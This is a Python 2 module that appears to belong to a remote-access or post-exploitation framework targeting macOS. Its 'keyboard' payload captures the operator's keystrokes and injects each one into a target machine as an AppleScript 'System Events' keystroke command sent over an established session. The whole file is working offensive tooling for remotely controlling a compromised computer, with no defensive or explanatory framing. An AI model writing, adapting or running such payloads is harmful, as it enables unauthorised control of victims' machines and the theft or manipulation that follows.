import time
import base64
try:
    # Win32
    from msvcrt import getch
except ImportError:
    # UNIX
    def getch():
        import sys, tty, termios
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        try:
            tty.setraw(fd)
            return sys.stdin.read(1)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)

class payload:
    def __init__(self):
        self.name = "keyboard"
        self.description = "your keyboard -> is target's keyboard"
        self.type = "applescript"
        self.id = 115

    def run(self,session,server,command):
        #do something with conn if you want
        print "type CTRL c to quit"
        print "start typing..."
        while 1:
            key = getch()
            if key == chr(03):
                return ""
            payload = """tell application "System Events"
            keystroke \""""+key+"""\"
            end tell"""
            server.sendCommand("keystroke",payload,self.type,session.conn)
        return ""

